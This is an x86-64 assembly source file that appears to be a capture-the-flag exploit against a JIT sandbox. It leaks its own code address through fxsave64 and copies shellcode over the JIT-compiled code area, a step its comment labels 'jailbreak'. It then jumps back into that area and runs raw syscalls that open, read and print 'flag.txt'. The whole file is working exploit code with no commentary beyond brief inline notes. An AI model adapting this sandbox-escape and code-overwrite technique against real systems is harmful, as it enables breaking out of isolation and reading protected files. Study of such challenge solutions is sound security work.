BITS 64
entry:
    fldz
    sub         rsp, 2048
    and         sp, 0xfff0
    fxsave64    [rsp]
    mov         rdi, [rsp+8]        ; addr of entry
    lea         rsi, [rel head]     ; addr of shellcode
    mov         ecx, tail-head      ; sizeof shellcode
    times tail-head-($-entry) nop   ; overwritten space
    rep movsb                       ; copy shellcode to JITted code area
    jmp         entry               ; jailbreak

head:
    xor         rax, rax
    mov         rbx, 'flag.txt'
    push        rax
    push        rbx
    mov         rdi, rsp            ; filename
    xor         rsi, rsi            ; flags
    xor         rdx, rdx            ; mode
    mov         rax, 2              ; sys_open
    syscall
    mov         rdi, rax            ; fd
    mov         rsi, rsp            ; buffer
    mov         rdx, 4096           ; size
    mov         rax, 0              ; sys_read
    syscall
    mov         rdi, 1              ; fd
    mov         rsi, rsp            ; buffer
    mov         rdx, rax            ; size
    mov         rax, 1              ; sys_write
    syscall
    mov         rax, 60             ; sys_exit
    syscall
tail:
